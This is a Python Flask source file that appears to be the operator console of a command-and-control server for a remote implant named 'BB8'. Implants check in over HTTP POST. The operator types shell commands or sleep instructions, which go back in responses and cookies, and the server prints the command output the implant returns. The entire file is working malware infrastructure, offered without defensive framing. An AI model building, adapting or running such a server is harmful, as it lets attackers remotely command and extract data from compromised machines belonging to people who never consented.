from flask import Flask, request, make_response
import warnings
import sys
import colorama
from colorama import Fore, Back, Style


colorama.init(autoreset=True)
warnings.filterwarnings('ignore')
sys.tracebacklimit = 0
app = Flask(__name__)
app.config['KEEP_ALIVE'] = True


# This is used to tell c2 when commands are being entered; they need to be parsed.
def prepping(is_prepped):
    if is_prepped == "Prep":
        global prepped
        prepped = True
        return prepped
    else:
        return False

@app.route("/testing", methods=['POST'])
def testing():
    try:
        string_1 = request.data.decode()    
        response = make_response("Set Cookie.")

        if string_1 == '': return "fi"

        # Initiate connection with BB8. Tell BB8 what to expect.
        if string_1.split("=")[1] == "ClientHello":
            print(Fore.RED + Style.BRIGHT + "Enter initialization option: ")
            what_next = input()

            # Begin command procedure.
            if what_next == "1": 
                response.set_cookie('Session', 'one')
                return response


            # Begin sleep procedure and reset "prepped" in order to start back at
            # the beggining and tell BB8 what to expect.
            if what_next == "2" and "prepped" in globals():
                prepped = None
                del globals()["prepped"]
                response.set_cookie('Session', 'two')
                return response

            # "What if I just want BB8 to go back to sleep?". That's what this is for.
            elif what_next == "2":
                response.set_cookie('Session', 'two')
                return response

# ADD RESET FUNCTIONALITY AFTER LONG BLACKOUTS

        if string_1.split("=")[1] == "Ready and waiting...":
            print(Fore.RED + Style.BRIGHT + "Enter command: ")
            cmd = input()
            
            # When sending 2,initiate sleep procedure.
            if cmd == "2":
                response.set_cookie('Session', 'two')
                return response

            return cmd


        if string_1.split("=")[1] == "Prep":
            prepping(string_1.split("=")[1])
            return "string"


        if string_1.split("=")[1] == "ClientHello" and prepped:
            print(Fore.RED + Style.BRIGHT + "Connection was re-established? Trying to get back to command prompt.")
            return "None"
        elif "prepped" in globals():
            print(Fore.RED + Style.BRIGHT + "Command output:\n" + Fore.GREEN + Style.BRIGHT + "=".join(string_1.split("=")[1:]))
            return "return"

    except Exception as e:
        pass

